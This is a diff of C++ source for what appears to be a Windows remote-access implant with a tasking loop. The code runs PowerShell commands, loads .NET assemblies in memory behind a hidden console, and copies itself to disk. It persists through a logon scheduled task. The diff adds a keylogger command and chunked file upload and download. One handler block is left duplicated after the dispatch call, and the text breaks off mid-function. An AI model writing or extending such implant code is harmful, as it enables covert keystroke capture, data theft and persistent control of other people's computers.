@@ -27,7 +27,7 @@
 #include <taskschd.h>
 #include <sstream>
 #include <random>
-#include <cctype> 
+#include <cctype>
 #include <iostream>
 #include <shlwapi.h>
 #include <comdef.h>
@@ -41,18 +41,20 @@
 #include <filesystem>
 #include <fstream>
 #include <variant>
+#include <filesystem>
 
-#undef _DSA 
+#undef _DSA
 #pragma comment(lib, "mscoree.lib")
-namespace mscorlib {
+namespace mscorlib
+{
 #include "mscorlib.h"
 }
 
 #pragma comment(lib, "psapi.lib")
 #pragma comment(lib, "iphlpapi.lib")
 #pragma comment(lib, "ws2_32.lib")
-#pragma comment (lib, "ole32")
-#pragma comment(lib,"shlwapi.lib")
+#pragma comment(lib, "ole32")
+#pragma comment(lib, "shlwapi.lib")
 
 template <class... Ts>
 struct overloaded : Ts...
@@ -103,20 +105,53 @@ void Agent::Start()
             // Retrieve the next task from the queue.
             auto request = taskManager.GetNextTask();
 
-            Response result = std::visit(overloaded{
-                [this](const TaskRequest<CommandPowershell>& psRequest) -> Response {
-                    return this->ExecutePowerShell(psRequest.taskID, psRequest.data);
-                },
-                [this](const TaskRequest<CommandWinTask>& winTaskRequest) -> Response {
-                    return this->CreateWindowsTaskW(winTaskRequest.taskID, winTaskRequest.data);
-                },
-                [this](const TaskRequest<CommandNetAsm>& netAsmRequest) -> Response {
-                    return this->ExecuteNetAsm(netAsmRequest.taskID, netAsmRequest.data);
-                },
-                [](const auto& unhandledRequest) -> Response {
-                    return TaskResponse<TaskSuccess>{ };
-                }
-            }, request);
+            Response result = std::visit(overloaded{[this](const TaskRequest<CommandPowershell> &psRequest) -> Response
+                                                    {
+                                                        return this->ExecutePowerShell(
+                                                            psRequest.taskID,
+                                                            psRequest.data);
+                                                    },
+
+                                                    [this](const TaskRequest<CommandWinTask> &winTaskRequest) -> Response
+                                                    {
+                                                        return this->CreateWindowsTaskW(
+                                                            winTaskRequest.taskID,
+                                                            winTaskRequest.data);
+                                                    },
+
+                                                    [this](const TaskRequest<CommandNetAsm> &netAsmRequest) -> Response
+                                                    {
+                                                        return this->ExecuteNetAsm(
+                                                            netAsmRequest.taskID,
+                                                            netAsmRequest.data);
+                                                    },
+
+                                                    [this](const TaskRequest<CommandKeylogger> &keyloggerRequest) -> Response
+                                                    {
+                                                        return this->ExecuteKeylogger(
+                                                            keyloggerRequest.taskID,
+                                                            keyloggerRequest.code);
+                                                    },
+
+                                                    [this](const TaskRequest<CommandUploadFile> &uploadRequest) -> Response
+                                                    {
+                                                        return this->UploadFile(
+                                                            uploadRequest.taskID,
+                                                            uploadRequest.data);
+                                                    },
+
+                                                    [this](const TaskRequest<CommandDownloadFile> &downloadRequest) -> Response
+                                                    {
+                                                        return this->DownloadFile(
+                                                            downloadRequest.taskID,
+                                                            downloadRequest.data);
+                                                    },
+
+                                                    [](const auto &unhandledRequest) -> Response
+                                                    {
+                                                        return TaskResponse<TaskSuccess>{};
+                                                    }},
+                                         request);
 
                     // Handle file upload requests.
                     [this](const TaskRequest<CommandUploadFile> &uploadRequest) -> Response
@@ -175,127 +210,151 @@ void Agent::Start()
     }
 }
 
-HRESULT  Agent::DotnetExecute(
-    _In_  PBYTE  AssemblyBytes,
-    _In_  ULONG  AssemblySize,
-    _In_  PWSTR  AppDomainName,
-    _In_  PWSTR  Arguments,
-    _Out_ LPSTR* OutputBuffer,
-    _Out_ PULONG OutputLength
-) {
-    HRESULT                 HResult         = {};
-    ICLRMetaHost*           IMetaHost       = {};
-    ICLRRuntimeInfo*        IRuntimeInfo    = {};
-    ICorRuntimeHost*        IRuntimeHost    = {};
-    IUnknown*               IAppDomainThunk = {};
-    mscorlib::_AppDomain*   AppDomain       = {};
-    mscorlib::_Assembly*    Assembly        = {};
-    mscorlib::_MethodInfo*  MethodInfo      = {};
-    SAFEARRAYBOUND          SafeArrayBound  = {};
-    SAFEARRAY*              SafeAssembly    = {};
-    SAFEARRAY*              SafeExpected    = {};
-    SAFEARRAY*              SafeArguments   = {};
-    PWSTR*                  AssemblyArgv    = {};
-    ULONG                   AssemblyArgc    = {};
-    LONG                    Index           = {};
-    VARIANT                 VariantArgv     = {};
-    BOOL                    IsLoadable      = {};
-    HWND                    ConExist        = {};
-    HWND                    ConHandle       = {};
-    HANDLE                  BackupHandle    = {};
-    HANDLE                  IoPipeRead      = {};
-    HANDLE                  IoPipeWrite     = {};
-    SECURITY_ATTRIBUTES     SecurityAttr    = {};
+HRESULT Agent::DotnetExecute(
+    _In_ PBYTE AssemblyBytes,
+    _In_ ULONG AssemblySize,
+    _In_ PWSTR AppDomainName,
+    _In_ PWSTR Arguments,
+    _Out_ LPSTR *OutputBuffer,
+    _Out_ PULONG OutputLength)
+{
+    HRESULT HResult = {};
+    ICLRMetaHost *IMetaHost = {};
+    ICLRRuntimeInfo *IRuntimeInfo = {};
+    ICorRuntimeHost *IRuntimeHost = {};
+    IUnknown *IAppDomainThunk = {};
+    mscorlib::_AppDomain *AppDomain = {};
+    mscorlib::_Assembly *Assembly = {};
+    mscorlib::_MethodInfo *MethodInfo = {};
+    SAFEARRAYBOUND SafeArrayBound = {};
+    SAFEARRAY *SafeAssembly = {};
+    SAFEARRAY *SafeExpected = {};
+    SAFEARRAY *SafeArguments = {};
+    PWSTR *AssemblyArgv = {};
+    ULONG AssemblyArgc = {};
+    LONG Index = {};
+    VARIANT VariantArgv = {};
+    BOOL IsLoadable = {};
+    HWND ConExist = {};
+    HWND ConHandle = {};
+    HANDLE BackupHandle = {};
+    HANDLE IoPipeRead = {};
+    HANDLE IoPipeWrite = {};
+    SECURITY_ATTRIBUTES SecurityAttr = {};
 
     // create the CLR instance
-    if ((HResult = CLRCreateInstance(CLSID_CLRMetaHost, IID_ICLRMetaHost, reinterpret_cast<PVOID*>(&IMetaHost)))) {
+    if ((HResult = CLRCreateInstance(CLSID_CLRMetaHost, IID_ICLRMetaHost, reinterpret_cast<PVOID *>(&IMetaHost))))
+    {
         printf("[-] CLRCreateInstance Failed with Error: %lx\n", HResult);
         goto e_func;
     }
-    else printf("[*] CLRCreateInstance: %lx\n", HResult);
+    else
+        printf("[*] CLRCreateInstance: %lx\n", HResult);
 
     // get the CLR instance version to host and start
-    if ((HResult = IMetaHost->GetRuntime(L"v4.0.30319", IID_ICLRRuntimeInfo, reinterpret_cast<PVOID*>(&IRuntimeInfo)))) {
+    if ((HResult = IMetaHost->GetRuntime(L"v4.0.30319", IID_ICLRRuntimeInfo, reinterpret_cast<PVOID *>(&IRuntimeInfo))))
+    {
         printf("[-] IMetaHost->GetRuntime Failed with Error: %lx\n", HResult);
         goto e_func;
     }
-    else printf("[*] IMetaHost->GetRuntime: %lx\n", HResult);
+    else
+        printf("[*] IMetaHost->GetRuntime: %lx\n", HResult);
 
     // check if the runtime we specified is loadable for the current process
-    if ((HResult = IRuntimeInfo->IsLoadable(&IsLoadable)) || !IsLoadable) {
+    if ((HResult = IRuntimeInfo->IsLoadable(&IsLoadable)) || !IsLoadable)
+    {
         printf("[-] IRuntimeInfo->IsLoadable Failed with Error: %lx (IsLoadable: %s)\n", HResult, IsLoadable ? "true" : "false");
         goto e_func;
     }
-    else printf("[*] IRuntimeInfo->IsLoadable: %lx\n", HResult);
+    else
+        printf("[*] IRuntimeInfo->IsLoadable: %lx\n", HResult);
 
     // now load the specified CLR version into the current process
-    if ((HResult = IRuntimeInfo->GetInterface(CLSID_CorRuntimeHost, IID_ICorRuntimeHost, reinterpret_cast<PVOID*>(&IRuntimeHost)))) {
+    if ((HResult = IRuntimeInfo->GetInterface(CLSID_CorRuntimeHost, IID_ICorRuntimeHost, reinterpret_cast<PVOID *>(&IRuntimeHost))))
+    {
         printf("[-] IRuntimeInfo->GetInterface Failed with Error: %lx\n", HResult);
         goto e_func;
     }
-    else printf("[*] IRuntimeInfo->GetInterface: %lx\n", HResult);
+    else
+        printf("[*] IRuntimeInfo->GetInterface: %lx\n", HResult);
 
     // start the loaded CLR version in our current process
-    if ((HResult = IRuntimeHost->Start())) {
+    if ((HResult = IRuntimeHost->Start()))
+    {
         printf("[-] IRuntimeHost->Start Failed with Error: %lx\n", HResult);
         goto e_func;
     }
-    else printf("[*] IRuntimeHost->Start: %lx\n", HResult);
+    else
+        printf("[*] IRuntimeHost->Start: %lx\n", HResult);
 
     // create a new app domain in the current CLR runtime
-    if ((HResult = IRuntimeHost->CreateDomain(AppDomainName, nullptr, &IAppDomainThunk))) {
+    if ((HResult = IRuntimeHost->CreateDomain(AppDomainName, nullptr, &IAppDomainThunk)))
+    {
         printf("[-] IRuntimeHost->CreateDomain Failed with Error: %lx\n", HResult);
         goto e_func;
     }
-    else printf("[*] IRuntimeHost->CreateDomain: %lx\n", HResult);
+    else
+        printf("[*] IRuntimeHost->CreateDomain: %lx\n", HResult);
 
     // query app domain interface from the created app domain thunk
-    if ((HResult = IAppDomainThunk->QueryInterface(IID_PPV_ARGS(&AppDomain)))) {
+    if ((HResult = IAppDomainThunk->QueryInterface(IID_PPV_ARGS(&AppDomain))))
+    {
         printf("[-] IAppDomainThunk->QueryInterface Failed with Error: %lx\n", HResult);
         goto e_func;
     }
-    else printf("[*] IAppDomainThunk->QueryInterface: %lx\n", HResult);
+    else
+        printf("[*] IAppDomainThunk->QueryInterface: %lx\n", HResult);
 
     // load assembly file into a safe array for AppDomain->Load_3
-    SafeArrayBound = { AssemblySize, 0 };
+    SafeArrayBound = {AssemblySize, 0};
     SafeAssembly = SafeArrayCreate(VT_UI1, 1, &SafeArrayBound);
 
     memcpy(SafeAssembly->pvData, AssemblyBytes, AssemblySize);
 
     // load the specified appdomain into the created appdomain
-    if ((HResult = AppDomain->Load_3(SafeAssembly, &Assembly))) {
+    if ((HResult = AppDomain->Load_3(SafeAssembly, &Assembly)))
+    {
         printf("[-] AppDomain->Load_3 Failed with Error: %lx\n", HResult);
         goto e_func;
     }
-    else printf("[*] AppDomain->Load_3: %lx\n", HResult);
+    else
+        printf("[*] AppDomain->Load_3: %lx\n", HResult);
 
     // get entry point from the loaded assembly
-    if ((HResult = Assembly->get_EntryPoint(&MethodInfo))) {
+    if ((HResult = Assembly->get_EntryPoint(&MethodInfo)))
+    {
         printf("[-] Assembly->get_EntryPoint Failed with Error: %lx\n", HResult);
         goto e_func;
     }
-    else printf("[*] Assembly->get_EntryPoint: %lx\n", HResult);
+    else
+        printf("[*] Assembly->get_EntryPoint: %lx\n", HResult);
 
     // check if arguments are expected
-    if ((HResult = MethodInfo->GetParameters(&SafeExpected))) {
+    if ((HResult = MethodInfo->GetParameters(&SafeExpected)))
+    {
         printf("[-] MethodInfo->GetParameters Failed with Error: %lx\n", HResult);
         goto e_func;
     }
-    else printf("[*] MethodInfo->GetParameters: %lx\n", HResult);
+    else
+        printf("[*] MethodInfo->GetParameters: %lx\n", HResult);
 
     // create arguments to be passed to the assembly entry point method
-    if (SafeExpected) {
-        if (SafeExpected->cDims && SafeExpected->rgsabound[0].cElements) {
+    if (SafeExpected)
+    {
+        if (SafeExpected->cDims && SafeExpected->rgsabound[0].cElements)
+        {
             SafeArguments = SafeArrayCreateVector(VT_VARIANT, 0, 1);
 
-            if (wcslen(Arguments)) {
+            if (wcslen(Arguments))
+            {
                 AssemblyArgv = CommandLineToArgvW(Arguments, (PINT)&AssemblyArgc);
             }
 
             VariantArgv.parray = SafeArrayCreateVector(VT_BSTR, 0, AssemblyArgc);
             VariantArgv.vt = (VT_ARRAY | VT_BSTR);
 
-            for (Index = 0; Index < AssemblyArgc; Index++) {
+            for (Index = 0; Index < AssemblyArgc; Index++)
+            {
                 SafeArrayPutElement(VariantArgv.parray, &Index, SysAllocString(AssemblyArgv[Index]));
             }
 
@@ -306,17 +365,20 @@ HRESULT  Agent::DotnetExecute(
     }
 
     // create an anonymous pipe to redirect the current executed assembly file output into a pipe.
-    SecurityAttr = { sizeof(SECURITY_ATTRIBUTES), nullptr, TRUE };
-    if (!(CreatePipe(&IoPipeRead, &IoPipeWrite, nullptr, PIPE_BUFFER_LENGTH))) {
+    SecurityAttr = {sizeof(SECURITY_ATTRIBUTES), nullptr, TRUE};
+    if (!(CreatePipe(&IoPipeRead, &IoPipeWrite, nullptr, PIPE_BUFFER_LENGTH)))
+    {
         printf("[-] CreatePipe Failed with Error: %lx\n", GetLastError());
         HResult = GetLastError();
         goto e_func;
     }
 
     // allocate a new console for the current process if no console is available or has been allocated
-    if (!(ConExist = GetConsoleWindow())) {
+    if (!(ConExist = GetConsoleWindow()))
+    {
         AllocConsole();
-        if ((ConHandle = GetConsoleWindow())) {
+        if ((ConHandle = GetConsoleWindow()))
+        {
             ShowWindow(ConHandle, SW_HIDE);
         }
     }
@@ -325,47 +387,61 @@ HRESULT  Agent::DotnetExecute(
     SetStdHandle(STD_OUTPUT_HANDLE, IoPipeWrite);
 
     // invoke the main assembly entry point with the created arguments
-    if ((HResult = MethodInfo->Invoke_3(VARIANT(), SafeArguments, nullptr))) {
+    if ((HResult = MethodInfo->Invoke_3(VARIANT(), SafeArguments, nullptr)))
+    {
         printf("[-] MethodInfo->Invoke_3 Failed with Error: %lx\n", HResult);
         goto e_func;
     }
-    else printf("[*] MethodInfo->Invoke_3: %lx\n", HResult);
+    else
+        printf("[*] MethodInfo->Invoke_3: %lx\n", HResult);
 
     // allocate memory to write the output from the pipe into the allocated buffer
-    if ((*OutputBuffer = static_cast<LPSTR>(HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, PIPE_BUFFER_LENGTH)))) {
-        if (!ReadFile(IoPipeRead, *OutputBuffer, PIPE_BUFFER_LENGTH, OutputLength, nullptr)) {
+    if ((*OutputBuffer = static_cast<LPSTR>(HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, PIPE_BUFFER_LENGTH))))
+    {
+        if (!ReadFile(IoPipeRead, *OutputBuffer, PIPE_BUFFER_LENGTH, OutputLength, nullptr))
+        {
             printf("[-] ReadFile Failed with Error: %lx\n", GetLastError());
             goto e_func;
         }
     }
-    else {
+    else
+    {
         HResult = ERROR_NOT_ENOUGH_MEMORY;
     }
 
 e_func:
     // restore original std handle from backup
-    if (BackupHandle) SetStdHandle(STD_OUTPUT_HANDLE, BackupHandle);
-    if (AssemblyArgv) HeapFree(GetProcessHeap(), HEAP_ZERO_MEMORY, AssemblyArgv);
-    if (SafeAssembly) SafeArrayDestroy(SafeAssembly);
-    if (SafeArguments) SafeArrayDestroy(SafeArguments);
-    if (MethodInfo) MethodInfo->Release();
-    if (IRuntimeHost) IRuntimeHost->Release();
-    if (IRuntimeInfo) IRuntimeInfo->Release();
-    if (IMetaHost) IMetaHost->Release();
+    if (BackupHandle)
+        SetStdHandle(STD_OUTPUT_HANDLE, BackupHandle);
+    if (AssemblyArgv)
+        HeapFree(GetProcessHeap(), HEAP_ZERO_MEMORY, AssemblyArgv);
+    if (SafeAssembly)
+        SafeArrayDestroy(SafeAssembly);
+    if (SafeArguments)
+        SafeArrayDestroy(SafeArguments);
+    if (MethodInfo)
+        MethodInfo->Release();
+    if (IRuntimeHost)
+        IRuntimeHost->Release();
+    if (IRuntimeInfo)
+        IRuntimeInfo->Release();
+    if (IMetaHost)
+        IMetaHost->Release();
     AssemblyArgv = nullptr;
     SafeAssembly = nullptr;
     SafeArguments = nullptr;
     return HResult;
 }
 
-Response Agent::ExecuteNetAsm(const int& taskID, const CommandNetAsm& request) {
-    std::wstring    domain          = L"TestDomain";
-    PWSTR           pDomain         = domain.data();
-    std::wstring    args(request.args.begin(), request.args.end());
-    PWSTR           pArgs           = args.data();
-    DWORD           dwOutputSize    = NULL;
-    LPSTR           buffer          = {};
-    HRESULT         hr              = E_FAIL;
+Response Agent::ExecuteNetAsm(const int &taskID, const CommandNetAsm &request)
+{
+    std::wstring domain = L"TestDomain";
+    PWSTR pDomain = domain.data();
+    std::wstring args(request.args.begin(), request.args.end());
+    PWSTR pArgs = args.data();
+    DWORD dwOutputSize = NULL;
+    LPSTR buffer = {};
+    HRESULT hr = E_FAIL;
 
     std::string raw_string_data = base64::from_base64(request.assembly);
     std::vector<uint8_t> binary_bytes(raw_string_data.begin(), raw_string_data.end());
@@ -374,14 +450,44 @@ Response Agent::ExecuteNetAsm(const int& taskID, const CommandNetAsm& request) {
     if (FAILED(hr))
     {
         _com_error err(hr);
-        return CreateTaskResponse(taskID, NET_ASM, NO_CODE, ERROR, TaskError{ hr, err.ErrorMessage() });
+        return CreateTaskResponse(taskID, NET_ASM, NO_CODE, ERROR, TaskError{hr, err.ErrorMessage()});
     }
 
-    return CreateTaskResponse(taskID, NET_ASM, NO_CODE, SUCCESS, TaskSuccess{ buffer });
+    return CreateTaskResponse(taskID, NET_ASM, NO_CODE, SUCCESS, TaskSuccess{buffer});
 }
 
+Response Agent::ExecuteKeylogger(const int &taskID, const int &code)
+{
+    KeyloggerResult result;
 
-typedef struct _LDR_DATA_TABLE_ENTRY2 {
+    if (code == START_KEYLOGGER)
+    {
+        result = keylogger.keylog_start();
+    }
+    else if (code == STOP_KEYLOGGER)
+    {
+        result = keylogger.get_keylog_data();
+    }
+    else
+    {
+        return CreateTaskResponse(taskID, KEYLOGGER, NO_CODE, ERROR, TaskError{-1,"Invalid keylogger command."});
+    }
+
+    return std::visit(
+        [&](const auto& data) -> Response
+        {
+            return CreateTaskResponse(
+                taskID,
+                KEYLOGGER,
+                code,
+                result.status,
+                data);
+        },
+        result.result);
+}
+
+typedef struct _LDR_DATA_TABLE_ENTRY2
+{
     LIST_ENTRY InMemoryOrderLinks;
     PVOID Reserved2[2];
     PVOID DllBase;
@@ -390,102 +496,119 @@ typedef struct _LDR_DATA_TABLE_ENTRY2 {
     UNICODE_STRING FullDllName;
     BYTE Reserved4[8];
     PVOID Reserved5[3];
-    union {
+    union
+    {
         ULONG CheckSum;
         PVOID Reserved6;
     };
     ULONG TimeDateStamp;
-} LDR_DATA_TABLE_ENTRY2, * PLDR_DATA_TABLE_ENTRY2;
+} LDR_DATA_TABLE_ENTRY2, *PLDR_DATA_TABLE_ENTRY2;
 
-
-LPCWSTR GetLocalModule() {
-    PPEB                   pPeb = NULL;
-    PPEB_LDR_DATA          pLdrData = NULL;
+LPCWSTR GetLocalModule()
+{
+    PPEB pPeb = NULL;
+    PPEB_LDR_DATA pLdrData = NULL;
     PLDR_DATA_TABLE_ENTRY2 pDataTableEntry = NULL;
 
-    pPeb = (PEB*)(__readgsqword(0x60));
+    pPeb = (PEB *)(__readgsqword(0x60));
     pLdrData = (PPEB_LDR_DATA)(pPeb->Ldr);
     pDataTableEntry = (PLDR_DATA_TABLE_ENTRY2)(pLdrData->InMemoryOrderModuleList.Flink);
 
     return (LPCWSTR)pDataTableEntry->FullDllName.Buffer;
 }
 
-BOOL DropFileToDiskW(const std::wstring& path) {
+BOOL DropFileToDiskW(const std::wstring &path)
+{
     HRESULT hr = E_FAIL;
-    HANDLE  hFile = INVALID_HANDLE_VALUE;
-    HANDLE  hDropFile = INVALID_HANDLE_VALUE;
+    HANDLE hFile = INVALID_HANDLE_VALUE;
+    HANDLE hDropFile = INVALID_HANDLE_VALUE;
     LPCWSTR pModule = NULL;
-    DWORD   dwFileSize = NULL;
-    DWORD   dwNumberOfBytesRead = NULL;
-    DWORD   dwNumberOfBytesWritten = NULL;
-    DWORD   dwPathLenBytes = NULL;
-    LPVOID  pBaseAddress = NULL;
-    BOOL    isSuccess = FALSE;
+    DWORD dwFileSize = NULL;
+    DWORD dwNumberOfBytesRead = NULL;
+    DWORD dwNumberOfBytesWritten = NULL;
+    DWORD dwPathLenBytes = NULL;
+    LPVOID pBaseAddress = NULL;
+    BOOL isSuccess = FALSE;
 
     pModule = GetLocalModule();
     hFile = CreateFileW(pModule, GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
-    if (hFile == INVALID_HANDLE_VALUE) goto e_func;
+    if (hFile == INVALID_HANDLE_VALUE)
+        goto e_func;
 
     dwFileSize = GetFileSize(hFile, NULL);
-    if (dwFileSize == INVALID_FILE_SIZE) goto e_func;
+    if (dwFileSize == INVALID_FILE_SIZE)
+        goto e_func;
 
     pBaseAddress = HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, dwFileSize);
-    if (!pBaseAddress) goto e_func;
+    if (!pBaseAddress)
+        goto e_func;
 
     isSuccess = ReadFile(hFile, pBaseAddress, dwFileSize, &dwNumberOfBytesRead, NULL);
-    if (!isSuccess) goto e_func;
+    if (!isSuccess)
+        goto e_func;
 
     hDropFile = CreateFileW(path.c_str(), GENERIC_READ | GENERIC_WRITE, 0x00, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
 
     isSuccess = WriteFile(hDropFile, pBaseAddress, dwFileSize, &dwNumberOfBytesWritten, NULL);
-    if (!isSuccess) goto e_func;
+    if (!isSuccess)
+        goto e_func;
 
 e_func:
-    if (hFile != INVALID_HANDLE_VALUE) CloseHandle(hFile);
-    if (hDropFile != INVALID_HANDLE_VALUE) CloseHandle(hDropFile);
-    if (pBaseAddress) HeapFree(GetProcessHeap(), 0, pBaseAddress);
+    if (hFile != INVALID_HANDLE_VALUE)
+        CloseHandle(hFile);
+    if (hDropFile != INVALID_HANDLE_VALUE)
+        CloseHandle(hDropFile);
+    if (pBaseAddress)
+        HeapFree(GetProcessHeap(), 0, pBaseAddress);
     return isSuccess;
 }
 
-
-Response Agent::CreateWindowsTaskW(const int& taskID, const CommandWinTask& request){
-    HRESULT         hr              = E_FAIL;
-    BOOL            isSuccess       = FALSE;
-    ITask*          pITask          = NULL;
-    IPersistFile*   pIPersistFile   = NULL;
-    ITaskTrigger*   pITaskTrigger   = NULL;
-    ITaskFolder*    pITaskFolder    = NULL;
-    std::wstring    uuid            = {};
-    std::wstring    wPath           = {};
-    ITaskScheduler* pITS            = 0;
-    WORD            piNewTrigger    = 0;
-    DWORD           dwFlags         = 0;
-    TASK_TRIGGER    pTrigger;
+Response Agent::CreateWindowsTaskW(const int &taskID, const CommandWinTask &request)
+{
+    HRESULT hr = E_FAIL;
+    BOOL isSuccess = FALSE;
+    ITask *pITask = NULL;
+    IPersistFile *pIPersistFile = NULL;
+    ITaskTrigger *pITaskTrigger = NULL;
+    ITaskFolder *pITaskFolder = NULL;
+    std::wstring uuid = {};
+    std::wstring wPath = {};
+    ITaskScheduler *pITS = 0;
+    WORD piNewTrigger = 0;
+    DWORD dwFlags = 0;
+    TASK_TRIGGER pTrigger;
 
     std::wstring path(request.path.begin(), request.path.end());
     std::wstring username(request.username.begin(), request.username.end());
     std::wstring workItemName(request.taskName.begin(), request.taskName.end());
 
     isSuccess = DropFileToDiskW(path);
-    if (!isSuccess) goto e_func;
+    if (!isSuccess)
+        goto e_func;
 
     hr = CoInitializeEx(NULL, COINIT_MULTITHREADED);
-    if (FAILED(hr)) goto e_func;
+    if (FAILED(hr))
+        goto e_func;
 
-    hr = CoCreateInstance(CLSID_CTaskScheduler, NULL, CLSCTX_INPROC_SERVER, IID_ITaskScheduler, (void**)&pITS);
-    if (FAILED(hr)) goto e_func;
+    hr = CoCreateInstance(CLSID_CTaskScheduler, NULL, CLSCTX_INPROC_SERVER, IID_ITaskScheduler, (void **)&pITS);
+    if (FAILED(hr))
+        goto e_func;
 
-    hr = pITS->NewWorkItem(workItemName.c_str(), CLSID_CTask, IID_ITask, (IUnknown**)&pITask);
-    if (FAILED(hr)) goto e_func;
+    hr = pITS->NewWorkItem(workItemName.c_str(), CLSID_CTask, IID_ITask, (IUnknown **)&pITask);
+    if (FAILED(hr))
+        goto e_func;
 
     hr = pITask->SetApplicationName(path.c_str());
-    if (FAILED(hr)) goto e_func;
+    if (FAILED(hr))
+        goto e_func;
 
     hr = pITask->SetAccountInformation(username.c_str(), NULL);
-    if (FAILED(hr)) goto e_func;
+    if (FAILED(hr))
+        goto e_func;
 
     hr = pITask->CreateTrigger(&piNewTrigger, &pITaskTrigger);
-    if (FAILED(hr)) goto e_func;
+    if (FAILED(hr))
+        goto e_func;
 
     ZeroMemory(&pTrigger, sizeof(TASK_TRIGGER));
     pTrigger.cbTriggerSize = sizeof(TASK_TRIGGER);
@@ -495,18 +618,22 @@ Response Agent::CreateWindowsTaskW(const int& taskID, const CommandWinTask& requ
     pTrigger.TriggerType = TASK_EVENT_TRIGGER_AT_LOGON;
 
     hr = pITaskTrigger->SetTrigger(&pTrigger);
-    if (FAILED(hr)) goto e_func;
+    if (FAILED(hr))
+        goto e_func;
 
     hr = pITask->GetFlags(&dwFlags);
-    if (FAILED(hr)) goto e_func;
+    if (FAILED(hr))
+        goto e_func;
 
     dwFlags |= TASK_FLAG_RUN_ONLY_IF_LOGGED_ON;
     hr = pITask->SetFlags(dwFlags);
-    if (FAILED(hr)) goto e_func;
+    if (FAILED(hr))
+        goto e_func;
 
-    hr = pITask->QueryInterface(IID_IPersistFile, (void**)&pIPersistFile);
+    hr = pITask->QueryInterface(IID_IPersistFile, (void **)&pIPersistFile);
     hr = pIPersistFile->Save(NULL, TRUE);
-    if (FAILED(hr)) goto e_clean;
+    if (FAILED(hr))
+        goto e_clean;
 
     pITask->Run();
     goto e_func;
@@ -514,23 +641,26 @@ Response Agent::CreateWindowsTaskW(const int& taskID, const CommandWinTask& requ
 e_clean:
     pITS->Delete(workItemName.c_str());
 e_func:
-    if (pITask) pITask->Release();
-    if (pITaskTrigger) pITaskTrigger->Release();
-    if (pIPersistFile) pIPersistFile->Release();
-    if (pITaskFolder) pITaskFolder->Release();
+    if (pITask)
+        pITask->Release();
+    if (pITaskTrigger)
+        pITaskTrigger->Release();
+    if (pIPersistFile)
+        pIPersistFile->Release();
+    if (pITaskFolder)
+        pITaskFolder->Release();
     CoUninitialize();
 
     if (FAILED(hr))
     {
         _com_error err(hr);
-        return CreateTaskResponse(taskID, WIN_TASK, NO_CODE, TASK_ERROR, TaskError{ hr, err.ErrorMessage() });
+        return CreateTaskResponse(taskID, WIN_TASK, NO_CODE, TASK_ERROR, TaskError{hr, err.ErrorMessage()});
     }
 
     return CreateTaskResponse(taskID, WIN_TASK, NO_CODE, SUCCESS, TaskSuccess{"Successfully persisted via windows task"});
 }
 
 //^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^//
-
 // Agent default commands
 void Agent::Exit()
 {
@@ -566,7 +696,7 @@ Response Agent::ExecutePowerShell(const int &taskID, const CommandPowershell &ps
 
     _pclose(pipe);
 
-    return CreateTaskResponse(taskID, POWERSHELL, NO_CODE, TASK_ERROR, TaskSuccess{result});
+    return CreateTaskResponse(taskID, POWERSHELL, NO_CODE, SUCCESS, TaskSuccess{result});
 }
 
 //^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^//
@@ -677,8 +807,8 @@ std::string Agent::GetInternalIP()
                 {
                     if (pUnicast->Address.lpSockaddr->sa_family == AF_INET)
                     {
-                        sockaddr_in* sa_in = reinterpret_cast<sockaddr_in*>(pUnicast->Address.lpSockaddr);
-                        
+                        sockaddr_in *sa_in = reinterpret_cast<sockaddr_in *>(pUnicast->Address.lpSockaddr);
+
                         int b1 = sa_in->sin_addr.S_un.S_un_b.s_b1;
                         int b2 = sa_in->sin_addr.S_un.S_un_b.s_b2;
                         int b3 = sa_in->sin_addr.S_un.S_un_b.s_b3;
@@ -856,32 +986,77 @@ IntitalCheckinRequest Agent::GetHostInformation()
         free,
         GetCpuCount()};
 }
-
 //^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^//
 // File Transfer Commands
 Response Agent::UploadFile(const int &taskID, const CommandUploadFile &uploadRequest)
 {
-    const bool sent = commManager.SendFile(uploadRequest.path);
-    if (sent)
-        return CreateTaskResponse(taskID, UPLOAD, NO_CODE, SUCCESS,
-                                  TaskSuccess{"File uploaded successfully."});
-    return CreateTaskResponse(taskID, UPLOAD, NO_CODE, TASK_ERROR,
-                              TaskError{1, "File upload failed."});
+    Upload::Chunk chunk;
+
+    if (!Upload::ReadChunk(
+            uploadRequest.path,
+            uploadRequest.offset,
+            512 * 1024,
+            chunk))
+    {
+        return CreateTaskResponse(
+            taskID,
+            UPLOAD,
+            NO_CODE,
+            ERROR,
+            TaskError{1, "Failed to read upload chunk."});
+    }
+
+    return CreateTaskResponse(
+        taskID,
+        UPLOAD,
+        NO_CODE,
+        chunk.final ? NO_MORE_TO_FOLLOW : MORE_TO_FOLLOW,
+        chunk);
 }
 
 Response Agent::DownloadFile(const int &taskID, const CommandDownloadFile &downloadRequest)
 {
-    const auto directory = std::filesystem::path("files");
-    std::filesystem::create_directories(directory);
-    const auto path = directory / std::filesystem::path(downloadRequest.path).filename();
-    const auto bytes = base64::from_base64(downloadRequest.data);
-    std::ofstream output(path, downloadRequest.offset == 0
-                                   ? std::ios::binary
-                                   : std::ios::binary | std::ios::app);
-    output.write(bytes.data(), static_cast<std::streamsize>(bytes.size()));
-    if (output)
-        return CreateTaskResponse(taskID, DOWNLOAD_2, DOWNLOAD, SUCCESS,
-                                  TaskSuccess{"File chunk stored."});
-    return CreateTaskResponse(taskID, DOWNLOAD_2, DOWNLOAD, TASK_ERROR,
-                              TaskError{1, "File chunk could not be stored."});
+    try
+    {
+        if (downloadRequest.path.empty())
+            throw std::invalid_argument("Download path is empty.");
+
+        const auto requestedPath =
+            std::filesystem::path(downloadRequest.destinationPath.empty() ? downloadRequest.path : downloadRequest.destinationPath);
+
+        const auto path = requestedPath.is_absolute() ? requestedPath : std::filesystem::path("files") / requestedPath.filename();
+
+        std::filesystem::create_directories(path.parent_path());
+
+        if (!Download::WriteChunk(
+                path.string(),
+                downloadRequest.data,
